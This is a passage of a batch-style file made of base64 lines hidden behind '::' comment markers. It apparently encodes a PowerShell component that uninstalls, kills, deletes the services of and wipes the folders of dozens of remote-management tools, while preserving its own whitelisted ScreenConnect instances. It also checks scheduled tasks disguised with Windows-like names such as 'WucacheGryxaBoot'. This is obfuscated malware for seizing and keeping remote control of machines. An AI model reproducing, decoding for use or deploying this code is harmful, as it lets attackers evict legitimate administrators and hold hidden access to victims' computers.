::JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNvbGFyV2luZHMiLCIkZW52OlByb2dy
::YW1GaWxlc1xEYW1lV2FyZSBSZW1vdGUgU3VwcG9ydCIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxEYW1lV2FyZSBSZW1vdGUgU3VwcG9ydCIpOyBQcm9kPUAoJ0Rh
::bWVXYXJlKicpIH0NCiAgICAgICAgQHsgVGFnPSdOZXRTdXBwb3J0JzsgICBTdmM9
::QCgnTmV0U3VwcG9ydConKTsgUHJvYz1AKCdjbGllbnQzMionLCdwY2ljdGwqJyk7
::IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmV0U3VwcG9ydCIsIiR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfVxOZXRTdXBwb3J0Iik7IFByb2Q9QCgnTmV0U3VwcG9y
::dConKSB9DQogICAgICAgIEB7IFRhZz0nU2ltcGxlSGVscCc7ICAgU3ZjPUAoJ1Np
::bXBsZUhlbHAqJyk7IFByb2M9QCgnU2ltcGxlU2VydmljZSonLCdzaW1wbGVzZXJ2
::aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNpbXBsZUhlbHAiLCIk
::e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2ltcGxlSGVscCIpOyBQcm9kPUAoJ1Np
::bXBsZUhlbHAqJykgfQ0KICAgICAgICBAeyBUYWc9J0dldFNjcmVlbic7ICAgIFN2
::Yz1AKCdHZXRTY3JlZW4qJyk7IFByb2M9QCgnR2V0U2NyZWVuKicpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXEdldFNjcmVlbiIsIiR7ZW52OlByb2dyYW1GaWxl
::cyh4ODYpfVxHZXRTY3JlZW4iKTsgUHJvZD1AKCdHZXRTY3JlZW4qJykgfQ0KICAg
::ICAgICBAeyBUYWc9J0lwZXJpdXMnOyAgICAgIFN2Yz1AKCdJcGVyaXVzKicpOyBQ
::cm9jPUAoJ0lwZXJpdXNSZW1vdGUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
::ZXNcSXBlcml1cyBSZW1vdGUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cSXBl
::cml1cyBSZW1vdGUiKTsgUHJvZD1AKCdJcGVyaXVzKicpIH0NCiAgICAgICAgQHsg
::VGFnPSdJU0xPbmxpbmUnOyAgIFN2Yz1AKCdJU0xsaWdodConKTsgUHJvYz1AKCdJ
::U0xsaWdodConLCdJU0xBbHdheXNPbionKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
::aWxlc1xJU0wgT25saW5lIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XElTTCBP
::bmxpbmUiKTsgUHJvZD1AKCdJU0wgTGlnaHQqJywnSVNMIEFsd2F5c09uKicpIH0N
::CiAgICAgICAgQHsgVGFnPSdBbW15eSc7ICAgICAgICBTdmM9QCgnQW1teXkqJyk7
::IFByb2M9QCgnQW1teXkqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQW1t
::eXkiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQW1teXkiKTsgUHJvZD1AKCdB
::bW15eSonKSB9DQogICAgICAgIEB7IFRhZz0nVWx0cmFWaWV3ZXInOyAgU3ZjPUAo
::J1VsdHJhVmlld2VyKicpOyBQcm9jPUAoJ1VsdHJhVmlld2VyKicpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXFVsdHJhVmlld2VyIiwiJHtlbnY6UHJvZ3JhbUZp
::bGVzKHg4Nil9XFVsdHJhVmlld2VyIik7IFByb2Q9QCgnVWx0cmFWaWV3ZXIqJykg
::fQ0KICAgICAgICBAeyBUYWc9J0Flcm9BZG1pbic7ICAgIFN2Yz1AKCdBZXJvQWRt
::aW4qJyk7IFByb2M9QCgnQWVyb0FkbWluKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
::bUZpbGVzXEFlcm9BZG1pbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBZXJv
::QWRtaW4iKTsgUHJvZD1AKCdBZXJvQWRtaW4qJykgfQ0KICAgICAgICBAeyBUYWc9
::J0xpdGVNYW5hZ2VyJzsgIFN2Yz1AKCdMaXRlTWFuYWdlcionKTsgUHJvYz1AKCdS
::T01TZXJ2ZXIqJywnUk9NVmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
::bGVzXExpdGVNYW5hZ2VyIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExpdGVN
::YW5hZ2VyIik7IFByb2Q9QCgnTGl0ZU1hbmFnZXIqJykgfQ0KICAgICAgICBAeyBU
::YWc9J1JhZG1pbic7ICAgICAgIFN2Yz1AKCdSYWRtaW4qJyk7IFByb2M9QCgncnNl
::cnZlcjMqJywnUmFkbWluKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJh
::ZG1pbiBTZXJ2ZXIgMyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSYWRtaW4g
::U2VydmVyIDMiKTsgUHJvZD1AKCdSYWRtaW4qJykgfQ0KICAgICAgICBAeyBUYWc9
::J05vTWFjaGluZSc7ICAgIFN2Yz1AKCdueHNlcnZlcionLCdueGQqJyk7IFByb2M9
::QCgnbnhkKicsJ254c2VydmVyKicsJ254cnVubmVyKicpOyBEaXJzPUAoIiRlbnY6
::UHJvZ3JhbUZpbGVzXE5vTWFjaGluZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
::fVxOb01hY2hpbmUiKTsgUHJvZD1AKCdOb01hY2hpbmUqJykgfQ0KICAgICAgICBA
::eyBUYWc9J05pbmphT25lJzsgICAgIFN2Yz1AKCdOaW5qYVJNTUFnZW50Jywnbmlu
::amFybW0qJywnTmluamFSTU0qJyk7IFByb2M9QCgnTmluamFSTU1BZ2VudConLCdu
::aW5qYXJtbSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xOaW5qYVJNTUFn
::ZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5pbmphUk1NQWdlbnQiLCIk
::ZW52OlByb2dyYW1EYXRhXE5pbmphUk1NQWdlbnQiLCIkZW52OlByb2dyYW1GaWxl
::c1xOaW5qYU9uZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOaW5qYU9uZSIp
::OyBQcm9kPUAoJ05pbmphUk1NKicsJ05pbmphT25lKicpIH0NCiAgICAgICAgQHsg
::VGFnPSdBdGVyYSc7ICAgICAgICBTdmM9QCgnQXRlcmFBZ2VudCcpOyBQcm9jPUAo
::J0F0ZXJhQWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQVRFUkEg
::TmV0d29ya3MiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQVRFUkEgTmV0d29y
::a3MiLCIkZW52OlByb2dyYW1EYXRhXEFURVJBIE5ldHdvcmtzIik7IFByb2Q9QCgn
::QXRlcmEqJykgfQ0KICAgICAgICBAeyBUYWc9J0Nvbm5lY3RXaXNlJzsgIFN2Yz1A
::KCdMVFNlcnZpY2UnLCdMVFN2Y01vbicpOyBQcm9jPUAoJ0xUU3ZjKicsJ0xUVHJh
::eSonKTsgRGlycz1AKCIkZW52OndpbmRpclxMVFN2YyIsIiRlbnY6UHJvZ3JhbUZp
::bGVzXExhYlRlY2ggQ2xpZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExh
::YlRlY2ggQ2xpZW50Iik7IFByb2Q9QCgnQ29ubmVjdFdpc2UgQXV0b21hdGUqJywn
::Q29ubmVjdFdpc2UgUk1NKicsJ0xhYlRlY2gqJykgfQ0KICAgICAgICBAeyBUYWc9
::J0thc2V5YSc7ICAgICAgIFN2Yz1AKCdBZ2VudE1vbicsJ0thc2V5YSonLCdLQUFE
::UyonKTsgUHJvYz1AKCdBZ2VudE1vbionLCdLYXNleWEqJyk7IERpcnM9QCgiJGVu
::djpQcm9ncmFtRmlsZXNcS2FzZXlhIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
::XEthc2V5YSIpOyBQcm9kPUAoJ0thc2V5YSBWU0EqJywnS2FzZXlhIEFnZW50Kicp
::IH0NCiAgICAgICAgQHsgVGFnPSdOYWJsZSc7ICAgICAgICBTdmM9QCgnQWR2YW5j
::ZWQgTW9uaXRvcmluZyBBZ2VudConLCdOLWFibGUqJywnTkNlbnRyYWwqJyk7IFBy
::b2M9QCgnRmlsZVN5c3RlbUFnZW50KicsJ05DZW50cmFsKicpOyBEaXJzPUAoIiRl
::bnY6UHJvZ3JhbUZpbGVzXEFkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQiLCIke2Vu
::djpQcm9ncmFtRmlsZXMoeDg2KX1cQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudCIs
::IiRlbnY6UHJvZ3JhbUZpbGVzXE4tYWJsZSBUZWNobm9sb2dpZXMiLCIke2VudjpQ
::cm9ncmFtRmlsZXMoeDg2KX1cTi1hYmxlIFRlY2hub2xvZ2llcyIsIiRlbnY6UHJv
::Z3JhbUZpbGVzXE1TUEEgRmlsZXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
::TVNQQSBGaWxlcyIpOyBQcm9kPUAoJ0FkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQq
::JywnTi1hYmxlKicsJ04tY2VudHJhbConLCdOLXNpZ2h0KicsJ1Rha2UgQ29udHJv
::bConLCdTb2xhcldpbmRzIE1TUConKSB9DQogICAgICAgIEB7IFRhZz0nU3luY3Jv
::JzsgICAgICAgU3ZjPUAoJ1N5bmNybyonLCdLYWJ1dG8qJyk7IFByb2M9QCgnU3lu
::Y3JvKicsJ0thYnV0byonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZXBh
::aXJUZWNoIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJlcGFpclRlY2giLCIk
::ZW52OlByb2dyYW1GaWxlc1xTeW5jcm8iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
::KX1cU3luY3JvIiwiJGVudjpQcm9ncmFtRGF0YVxTeW5jcm8iKTsgUHJvZD1AKCdT
::eW5jcm8qJywnS2FidXRvKicsJ1JlcGFpclRlY2gqJykgfQ0KICAgICAgICBAeyBU
::YWc9J1B1bHNld2F5JzsgICAgIFN2Yz1AKCdQdWxzZXdheSonLCdQQyBNb25pdG9y
::KicpOyBQcm9jPUAoJ1BDTW9uaXRvck1ncionLCdQQ01vbml0b3JNYW5hZ2VyKics
::J1B1bHNld2F5KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFB1bHNld2F5
::IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFB1bHNld2F5IiwiJGVudjpQcm9n
::cmFtRmlsZXNcUEMgTW9uaXRvciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQ
::QyBNb25pdG9yIik7IFByb2Q9QCgnUHVsc2V3YXkqJywnUEMgTW9uaXRvcionKSB9
::DQogICAgICAgIEB7IFRhZz0nU3VwZXJPcHMnOyAgICAgU3ZjPUAoJ1N1cGVyT3Bz
::KicpOyBQcm9jPUAoJ1N1cGVyT3BzKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
::bGVzXFN1cGVyT3BzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN1cGVyT3Bz
::IiwiJGVudjpQcm9ncmFtRGF0YVxTdXBlck9wcyIpOyBQcm9kPUAoJ1N1cGVyT3Bz
::KicpIH0NCiAgICAgICAgQHsgVGFnPSdMZXZlbCc7ICAgICAgICBTdmM9QCgnTGV2
::ZWwqJyk7IFByb2M9QCgnbGV2ZWwqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
::ZXNcTGV2ZWwiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGV2ZWwiLCIkZW52
::OlByb2dyYW1EYXRhXExldmVsIik7IFByb2Q9QCgnTGV2ZWwqJykgfQ0KICAgICAg
::ICBAeyBUYWc9J0FjdGlvbjEnOyAgICAgIFN2Yz1AKCdBY3Rpb24xKicpOyBQcm9j
::PUAoJ0FjdGlvbjEqJywnYWN0aW9uMV9hZ2VudConKTsgRGlycz1AKCIkZW52OlBy
::b2dyYW1GaWxlc1xBY3Rpb24xIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFj
::dGlvbjEiLCIkZW52OlByb2dyYW1EYXRhXEFjdGlvbjEiKTsgUHJvZD1AKCdBY3Rp
::b24xKicpIH0NCiAgICAgICAgQHsgVGFnPSdNYW5hZ2VFbmdpbmUnOyBTdmM9QCgn
::TWFuYWdlRW5naW5lKicsJ1VFTVMqJywnRENBZ2VudConKTsgUHJvYz1AKCdNYW5h
::Z2VFbmdpbmUqJywnZGNhZ2VudConLCdVRU1TKicpOyBEaXJzPUAoIiRlbnY6UHJv
::Z3JhbUZpbGVzXE1hbmFnZUVuZ2luZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
::fVxNYW5hZ2VFbmdpbmUiKTsgUHJvZD1AKCdNYW5hZ2VFbmdpbmUqJywnVUVNUyon
::LCdEZXNrdG9wIENlbnRyYWwqJywnRW5kcG9pbnQgQ2VudHJhbConLCdSTU0gQ2Vu
::dHJhbConKSB9DQogICAgICAgIEB7IFRhZz0nVGFjdGljYWxSTU0nOyAgU3ZjPUAo
::J3RhY3RpY2Fscm1tKicsJ01lc2ggQWdlbnQnLCdNZXNoQWdlbnQnKTsgUHJvYz1A
::KCd0YWN0aWNhbHJtbSonLCdtZXNoYWdlbnQqJywnTWVzaEFnZW50KicpOyBEaXJz
::PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRhY3RpY2FsQWdlbnQiLCIke2VudjpQcm9n
::cmFtRmlsZXMoeDg2KX1cVGFjdGljYWxBZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVz
::XE1lc2ggQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWVzaCBBZ2Vu
::dCIpOyBQcm9kPUAoJ1RhY3RpY2FsKicsJ01lc2ggQWdlbnQqJywnTWVzaENlbnRy
::YWwqJykgfQ0KICAgICAgICBAeyBUYWc9J01lc2hDZW50cmFsJzsgIFN2Yz1AKCdN
::ZXNoIEFnZW50JywnTWVzaEFnZW50JywnTWVzaENlbnRyYWwqJyk7IFByb2M9QCgn
::TWVzaEFnZW50KicsJ01lc2hDZW50cmFsKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
::bUZpbGVzXE1lc2ggQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWVz
::aCBBZ2VudCIpOyBQcm9kPUAoJ01lc2gqQWdlbnQqJywnTWVzaENlbnRyYWwqJykg
::fQ0KICAgICAgICBAeyBUYWc9J0NvbnRpbnV1bSc7ICAgIFN2Yz1AKCdTQUFaKics
::J0NvbnRpbnV1bSonKTsgUHJvYz1AKCdTQUFaKicsJ0NvbnRpbnV1bSonKTsgRGly
::cz1AKCIkZW52OlByb2dyYW1GaWxlc1xTQUFaT0QiLCIke2VudjpQcm9ncmFtRmls
::ZXMoeDg2KX1cU0FBWk9EIiwiJGVudjpQcm9ncmFtRmlsZXNcQ29udGludXVtIiwi
::JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XENvbnRpbnV1bSIpOyBQcm9kPUAoJ0Nv
::bnRpbnV1bSonLCdTQUFaKicpIH0NCiAgICAgICAgQHsgVGFnPSdOYXZlcmlzayc7
::ICAgICBTdmM9QCgnTmF2ZXJpc2sqJyk7IFByb2M9QCgnTmF2ZXJpc2sqJyk7IERp
::cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmF2ZXJpc2siLCIke2VudjpQcm9ncmFt
::RmlsZXMoeDg2KX1cTmF2ZXJpc2siKTsgUHJvZD1AKCdOYXZlcmlzayonKSB9DQog
::ICAgICAgIEB7IFRhZz0nSW1teUJvdCc7ICAgICAgU3ZjPUAoJ0ltbXlCb3QqJywn
::SW1teSonKTsgUHJvYz1AKCdJbW15QWdlbnQqJywnSW1teUJvdConKTsgRGlycz1A
::KCIkZW52OlByb2dyYW1GaWxlc1xJbW15Qm90IiwiJHtlbnY6UHJvZ3JhbUZpbGVz
::KHg4Nil9XEltbXlCb3QiLCIkZW52OlByb2dyYW1EYXRhXEltbXlCb3QiKTsgUHJv
::ZD1AKCdJbW15Qm90KicpIH0NCiAgICAgICAgQHsgVGFnPSdBdXRvbW94JzsgICAg
::ICBTdmM9QCgnYW1hZ2VudConLCdBdXRvbW94KicpOyBQcm9jPUAoJ2FtYWdlbnQq
::Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQXV0b21veCIsIiR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfVxBdXRvbW94IiwiJGVudjpQcm9ncmFtRGF0YVxhbWFn
::ZW50Iik7IFByb2Q9QCgnQXV0b21veConKSB9DQogICAgICAgIEB7IFRhZz0nQWNy
::b25pc0N5YmVyJzsgU3ZjPUAoJ0Fjcm9uaXMqJyk7IFByb2M9QCgnYWNyb2NtZCon
::KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBY3JvbmlzIiwiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XEFjcm9uaXMiKTsgUHJvZD1AKCdBY3JvbmlzIEN5YmVy
::KicsJ0Fjcm9uaXMgQWdlbnQqJywnQ3liZXIgUHJvdGVjdCBBZ2VudConKSB9DQog
::ICAgICAgIEB7IFRhZz0nRG9tb3R6JzsgICAgICAgU3ZjPUAoJ0RvbW90eionKTsg
::UHJvYz1AKCdEb21vdHoqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcRG9t
::b3R6IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XERvbW90eiIpOyBQcm9kPUAo
::J0RvbW90eionKSB9DQogICAgICAgIEB7IFRhZz0nQXV2aWsnOyAgICAgICAgU3Zj
::PUAoJ0F1dmlrKicpOyBQcm9jPUAoJ0F1dmlrKicpOyBEaXJzPUAoIiRlbnY6UHJv
::Z3JhbUZpbGVzXEF1dmlrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEF1dmlr
::Iik7IFByb2Q9QCgnQXV2aWsqJykgfQ0KICAgICAgICBAeyBUYWc9J0JhcnJhY3Vk
::YVJNTSc7IFN2Yz1AKCdCYXJyYWN1ZGEqJyk7IFByb2M9QCgnTVdTZXJ2aWNlKicp
::OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEJhcnJhY3VkYSIsIiR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfVxCYXJyYWN1ZGEiLCIkZW52OlByb2dyYW1GaWxlc1xM
::ZXZlbCBQbGF0Zm9ybXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGV2ZWwg
::UGxhdGZvcm1zIik7IFByb2Q9QCgnQmFycmFjdWRhIFJNTSonLCdNYW5hZ2VkIFdv
::cmtwbGFjZSonKSB9DQogICAgICAgIEB7IFRhZz0nR292ZXJsYW4nOyAgICAgU3Zj
::PUAoJ0dvdmVybGFuKicpOyBQcm9jPUAoJ2dvdmVybGFuKicsJ2dvdmFnZW50Kicp
::OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvdmVybGFuIiwiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XEdvdmVybGFuIik7IFByb2Q9QCgnR292ZXJsYW4qJykg
::fQ0KICAgICAgICBAeyBUYWc9J1BEUSc7ICAgICAgICAgIFN2Yz1AKCdQRFEqJyk7
::IFByb2M9QCgnUERRUnVubmVyKicsJ1BEUUludmVudG9yeSonLCdQRFFEZXBsb3kq
::Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWRtaW4gQXJzZW5hbCIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBZG1pbiBBcnNlbmFsIiwiJGVudjpQcm9n
::cmFtRmlsZXNcUERRIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFBEUSIpOyBQ
::cm9kPUAoJ1BEUSBEZXBsb3kqJywnUERRIEludmVudG9yeSonLCdQRFEgQ29ubmVj
::dConKSB9DQogICAgKQ0KDQogICAgZm9yZWFjaCAoJHRvb2wgaW4gJHJtbSkgew0K
::ICAgICAgICAkaGl0ID0gJGZhbHNlDQogICAgICAgIGZvcmVhY2ggKCRwYXQgaW4g
::JHRvb2wuUHJvZCkgew0KICAgICAgICAgICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNj
::cmlwdDpVbmluc3RhbGxSb290cykgew0KICAgICAgICAgICAgICAgIEdldC1DaGls
::ZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JF
::YWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAgICAgICRkbiA9IChHZXQtSXRl
::bVByb3BlcnR5ICRfLlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
::ZSkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRkbiAtYW5k
::ICRkbiAtbGlrZSAkcGF0KSB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAo
::SXMtRGF0dG9LZWVwZXIgJGRuKSB7IExvZyAicm1tX3NraXBfZGF0dG9fa2VlcCBb
::JGRuXSI7IHJldHVybiB9DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoVW5p
::bnN0YWxsLVByb2R1Y3RLZXkgJF8pIHsgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZSB9
::DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAg
::ICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAk
::dG9vbC5TdmMpIHsNCiAgICAgICAgICAgIEdldC1TZXJ2aWNlIC1OYW1lICRwYXQg
::LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7
::DQogICAgICAgICAgICAgICAgaWYgKElzLURhdHRvS2VlcGVyICRfLk5hbWUgLW9y
::IElzLURhdHRvS2VlcGVyICRfLkRpc3BsYXlOYW1lKSB7IExvZyAicm1tX3NraXBf
::ZGF0dG9fc3ZjICQoJF8uTmFtZSkiOyByZXR1cm4gfQ0KICAgICAgICAgICAgICAg
::ICYgc2MuZXhlIHN0b3AgIiQoJF8uTmFtZSkiIDI+JjEgfCBPdXQtTnVsbA0KICAg
::ICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNTAwDQogICAg
::ICAgICAgICAgICAgJiBzYy5leGUgZGVsZXRlICIkKCRfLk5hbWUpIiAyPiYxIHwg
::T3V0LU51bGwNCiAgICAgICAgICAgICAgICAkbi5ybW0rKzsgJGhpdCA9ICR0cnVl
::OyBMb2cgInJtbV9zdmNfZGVsZXRlZCAkKCRfLk5hbWUpIFskKCR0b29sLlRhZyld
::Ig0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCRw
::YXQgaW4gJHRvb2wuUHJvYykgew0KICAgICAgICAgICAgR2V0LVByb2Nlc3MgLU5h
::bWUgJHBhdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gt
::T2JqZWN0IHsNCiAgICAgICAgICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLklk
::IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAg
::ICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX3Byb2Nfa2ls
::bGVkICQoJF8uUHJvY2Vzc05hbWUpIFskKCR0b29sLlRhZyldIg0KICAgICAgICAg
::ICAgfQ0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCRkIGluICR0b29sLkRp
::cnMpIHsNCiAgICAgICAgICAgIGlmICgkZCAtYW5kIChUZXN0LVBhdGggLUxpdGVy
::YWxQYXRoICRkKSkgew0KICAgICAgICAgICAgICAgIGlmIChJcy1EYXR0b0tlZXBl
::ciAkZCkgeyBMb2cgInJtbV9za2lwX2RhdHRvX2RpciAkZCI7IGNvbnRpbnVlIH0N
::CiAgICAgICAgICAgICAgICBpZiAoRm9yY2UtUmVtb3ZlRGlyICRkKSB7ICRuLnJt
::bSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX2Rpcl9yZW1vdmVkICRkIiB9DQog
::ICAgICAgICAgICAgICAgZWxzZSB7ICRuLmZhaWwrKzsgTG9nICJybW1fZGlyX1JF
::TU9WRV9GQUlMRUQgJGQiIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAg
::ICAgICBpZiAoJGhpdCkgeyBMb2cgInJtbV9leHRlcm1pbmF0ZWQgJCgkdG9vbC5U
::YWcpIiB9DQogICAgfQ0KDQogICAgJHN1bW1hcnkgPSAiZXh0ZXJtaW5hdGUgc3Zj
::PSQoJG4uc3ZjKSBwcm9jPSQoJG4ucHJvYykgZGlyPSQoJG4uZGlyKSBwcm9kdWN0
::PSQoJG4ucHJvZHVjdCkgcm1tPSQoJG4ucm1tKSBmYWlsPSQoJG4uZmFpbCkiDQog
::ICAgTG9nICRzdW1tYXJ5DQogICAgcmV0dXJuICRzdW1tYXJ5DQp9DQoNCmZ1bmN0
::aW9uIFVwZGF0ZS1TdGF0ZSB7DQogICAgJGtlZXAgPSBAKEdldC1LZWVwRmluZ2Vy
::cHJpbnRzKQ0KICAgICRncnl4YUZwID0gR2V0LUdyeXhhRnANCiAgICAkc2V2cnog
::PSBAKEdldC1TZXZyektlZXApDQogICAgJHByaW1GcCA9ICRzZXZyelswXTsgJGFs
::dEZwID0gJHNldnJ6WzFdDQogICAgJHByaW0gPSAkbnVsbDsgJGFsdCA9ICRudWxs
::OyAkc2NyaXB0OmdyeXhhID0gJG51bGwNCiAgICBmb3JlYWNoICgkc3ZjIGluIChH
::ZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykpIHsNCiAg
::ICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScp
::IHsNCiAgICAgICAgICAgICRmcCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKQ0KICAg
::ICAgICAgICAgaWYgKCRmcCAtZXEgJHByaW1GcCkgeyAkcHJpbSA9ICIkKCRzdmMu
::U3RhdHVzKSIgfQ0KICAgICAgICAgICAgZWxzZWlmICgkZnAgLWVxICRhbHRGcCkg
::eyAkYWx0ID0gIiQoJHN2Yy5TdGF0dXMpIiB9DQogICAgICAgICAgICBlbHNlaWYg
::KCRmcCAtZXEgJGdyeXhhRnAgLW9yIChUZXN0LUlzR3J5eGFGcCAkZnApKSB7ICRz
::Y3JpcHQ6Z3J5eGEgPSAiJCgkc3ZjLlN0YXR1cykiIH0NCiAgICAgICAgfQ0KICAg
::IH0NCiAgICAkZm9yZWlnbiA9IEAoKQ0KICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdl
::dC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConKSkgew0KICAg
::ICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJyAt
::YW5kICRtYXRjaGVzWzFdIC1ub3RpbiAka2VlcCkgew0KICAgICAgICAgICAgJGZv
::cmVpZ24gKz0gJG1hdGNoZXNbMV0NCiAgICAgICAgfQ0KICAgIH0NCiAgICAkaWQg
::PSBSZWFkLUlkZW50aXR5DQogICAgJHRhc2tzT2sgPSAwOyAkdGFza3NUb3RhbCA9
::IDANCiAgICBmb3JlYWNoICgkayBpbiAnVEFTS19BJywnVEFTS19CJywnVEFTS19D
::JywnVEFTS19EJykgew0KICAgICAgICAkdGFza3NUb3RhbCsrDQogICAgICAgICR0
::biA9IE5vcm1hbGl6ZS1UYXNrTmFtZSAoW3N0cmluZ10kaWRbJGtdKQ0KICAgICAg
::ICBpZiAoLW5vdCAkdG4pIHsgY29udGludWUgfQ0KICAgICAgICAkbWFya2VyID0g
::aWYgKCRrIC1lcSAnVEFTS19CJykgeyAnZXRsX21vbi5jbWQnIH0gZWxzZSB7ICdv
::d25fbW9uLmNtZCcgfQ0KICAgICAgICBpZiAoKFRlc3QtVGFza093bnNNb24gJHRu
::ICRtYXJrZXIpIC1vciAoVGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkbWFya2Vy
::KSkgeyAkdGFza3NPaysrIH0NCiAgICB9DQogICAgIyBMMzk6IGNvdW50IFd1Y2Fj
::aGVHcnl4YUJvb3QgKFRBU0tfRykNCiAgICAkdGFza3NUb3RhbCsrDQogICAgJHRn
::TmFtZSA9ICdXdWNhY2hlR3J5eGFCb290Jw0KICAgIGlmICgoR2V0LVNjaGVkdWxl
::ZFRhc2sgLVRhc2tOYW1lICR0Z05hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
